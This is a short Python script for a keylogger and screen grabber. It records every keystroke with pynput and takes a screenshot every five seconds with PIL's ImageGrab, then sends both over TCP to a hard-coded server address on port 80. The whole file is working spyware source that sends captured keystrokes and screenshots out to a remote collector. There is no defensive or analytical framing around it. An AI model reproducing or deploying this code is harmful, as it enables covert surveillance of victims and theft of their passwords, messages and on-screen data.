
import socket
import threading
import time
from pynput import keyboard
from PIL import ImageGrab
import io

# Server details
SERVER_IP = '192.168.31.235'  # Change to the server's IP address
SERVER_PORT = 80

# Function to send keystrokes to the server
def send_keystrokes():
    def on_press(key):
        try:
            k = key.char
        except:
            k = key.name
        if k:
            message = f"Key {k} pressed\n"
            send_to_server(message.encode('utf-8'))
    
    def on_release(key):
        if key == keyboard.Key.esc:
            return False

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()

# Function to capture and send screenshots to the server
def send_screenshots(interval=5):
    while True:
        screenshot = ImageGrab.grab()
        buf = io.BytesIO()
        screenshot.save(buf, format='PNG')
        screenshot_data = buf.getvalue()
        data_length = len(screenshot_data).to_bytes(4, 'big')
        send_to_server(data_length + screenshot_data)
        time.sleep(interval)

# Function to send data to the server
def send_to_server(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(data)
    except Exception as e:
        print(f"Failed to send data to server: {e}")

# Run the keylogger and screenshot sender in separate threads
def main():
    keylogger_thread = threading.Thread(target=send_keystrokes)
    screenshot_thread = threading.Thread(target=send_screenshots)

    keylogger_thread.start()
    screenshot_thread.start()

    keylogger_thread.join()
    screenshot_thread.join()

if __name__ == '__main__':
    main()


